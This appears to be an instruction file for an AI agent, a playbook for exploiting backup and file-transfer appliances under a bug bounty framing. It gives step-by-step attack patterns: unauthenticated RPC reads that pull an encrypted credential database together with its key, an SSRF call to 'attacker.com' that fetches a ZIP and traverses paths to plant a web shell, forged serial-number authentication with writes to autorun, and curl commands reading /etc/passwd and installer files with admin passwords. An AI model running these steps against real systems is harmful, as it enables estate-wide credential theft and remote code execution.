---
name: backup-mft-attacks
description: "Exploit backup and managed-file-transfer products — Veeam .NET Remoting bridge gadgets, NAKIVO unauth RPC credential-database extraction, Commvault auth skip plus SSRF plus ZIP traversal, and MOVEit/GoAnywhere/Cleo pre-auth chains. Use when recon fingerprints a backup or MFT appliance, since these hold credentials for the whole estate and rate Critical."
---

# Backup & File Transfer Product Attack Patterns

## Crown Jewel Targets

- Veeam Backup & Replication (400K+ customers, .NET Remoting + bridge gadgets)
- NAKIVO Backup (unauth RPC for credential database extraction)
- Commvault Command Center (auth skip + SSRF + ZIP path traversal)
- GoAnywhere MFT (nested deserialization via SignedObject, cl0p target)
- Cleo Harmony/VLTrader (cluster sync endpoint abuse, serial number forgery)
- MOVEit Transfer (SQL injection, mass exploitation by ransomware groups)

## Attack Surface Signals

- Management ports: 9392, 9443, 8443, 4443, 7171
- Cluster sync endpoints: `/Synchronization`, `/c/router`
- Auth skip endpoints: `authSkipRules.xml`, `@AllowAnonymous`
- Installer artifacts: `InitAccount.cmd`, `setup.log` still accessible
- `VLSync` header in HTTP requests (Cleo products)

**Sources:** WatchTowr Labs (Veeam, NAKIVO, Commvault, GoAnywhere, Cleo, 2024-2026)
**Key CVEs:** CVE-2024-40711, CVE-2024-48248, CVE-2025-34028, CVE-2025-10035, CVE-2024-50623

## Overview

Backup and Managed File Transfer (MFT) products store credentials for entire infrastructures and have cluster sync endpoints that assume trusted-network access. Any file read on a backup product = full credential compromise.

## 1. Credential Extraction via File Read

**NAKIVO CVE-2024-48248 pattern:**
- Unauth RPC: `POST /c/router` with `STPreLoadManagement.getImageByPath`
- Read `product01.h2.db` (encrypted creds) + `config.properties` (encryption key)
- Decrypt: AWS keys, SSH creds, Domain Controller passwords
- Pattern: backup products store encrypted creds + encryption key on SAME filesystem

**SysAid variant:**
- XXE reads `InitAccount.cmd` containing plaintext admin password
- Installer artifacts persist post-installation and are never cleaned up

## 2. Cluster Sync Endpoint Abuse

**Cleo CVE-2024-50623 pattern:**
- `/Synchronization` endpoint for cluster file sync
- `VLSync` header: `Retrieve` (read) and `ADD` (write) with path traversal
- Serial number "auth": 13 chars, second half = XOR of first — trivially forged
- Write to autorun directory = automatic code execution

**Commvault CVE-2025-34028 pattern:**
- `deployWebpackage.do` listed in `authSkipRules.xml` (no auth)
- SSRF: `commcellName=attacker.com` fetches attacker ZIP
- Path traversal: `servicePack=../../Reports/MetricsUpload/shell/`
- ZIP extracted to web-accessible `/reports/` directory

## 3. Nested Deserialization Bypass

**GoAnywhere CVE-2025-10035 pattern:**
- Error handler binds license token to unauthenticated session
- `SignedObject` passes whitelist, but `getObject()` is unrestricted
- Hard-coded encryption keys enable offline crafting
- 20K+ instances; cl0p ransomware previously mass-exploited same product

## 4. Auth Skip Endpoint Audit

Many Java apps maintain explicit auth exclusion lists:
- `authSkipRules.xml` (Commvault)
- `web.xml` filter-mapping exclusions
- Spring Security `permitAll()` paths
- `@AllowAnonymous` annotations (.NET)

## Detection & Recon

```bash
# Common backup/MFT management ports
nmap -p 9392,9443,8443,4443,7171 target

# Cluster sync endpoints
curl -X POST https://target/Synchronization -H "VLSync: Retrieve"
curl -X POST https://target/c/router -d '{"action":"STPreLoadManagement","method":"getImageByPath","data":["/etc/passwd"]}'

# Auth skip endpoints
curl https://target/commandcenter/deployWebpackage.do
curl https://target/goanywhere/license/Unlicensed.xhtml

# Installer artifacts
curl https://target/logs/InitAccount.cmd
curl https://target/setup.log
```

## Bug Bounty Relevance

- **CRITICAL**: Backup products have credentials for ENTIRE infrastructure
- MFT products (MOVEit, GoAnywhere, Cleo) are #1 ransomware target
- File read + credential extraction = full infrastructure compromise
- Cluster sync endpoints frequently exposed unintentionally
- cl0p group systematically targets this product class

## Operator Notes (Battle-Tested)

- **Backup products = keys to the kingdom**: They store credentials for the ENTIRE infrastructure. Any file read on a backup product = full credential compromise for every managed system.
- **Credential + encryption key on same filesystem**: NAKIVO pattern — encrypted credential database and encryption key are on the same disk. File read = decrypt everything.
- **Cluster sync endpoints assume trusted network**: Cleo's `/Synchronization` endpoint uses trivially forgeable serial number auth (second half = XOR of first). Write to autorun directory = automatic code execution.
- **Auth skip endpoint audit is crucial**: Check `authSkipRules.xml`, `web.xml` filter exclusions, Spring Security `permitAll()` paths, `@AllowAnonymous` annotations. These explicitly list unauthenticated paths.
- **Installer artifacts persist forever**: `InitAccount.cmd` with plaintext admin passwords is never cleaned up post-installation. Check `/logs/`, `/setup/`, root web paths.
- **cl0p targets this product class systematically**: MOVEit, GoAnywhere, Cleo have all been mass-exploited. Finding new vulns in MFT products is extremely high-value for bug bounty.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `deserialization-testing` → `references/dotnet-deserialization-advanced.md` | Veeam/GoAnywhere .NET deser chains |
| `deserialization-testing` → `references/java-hessian-deserialization.md` | Java MFT product deser |
| `execution-after-redirect` | EAR on MFT admin panels |
| `appliance-management-attacks` | Management interface exploitation |
| `ssrf-testing` | Commvault SSRF to ZIP extraction |
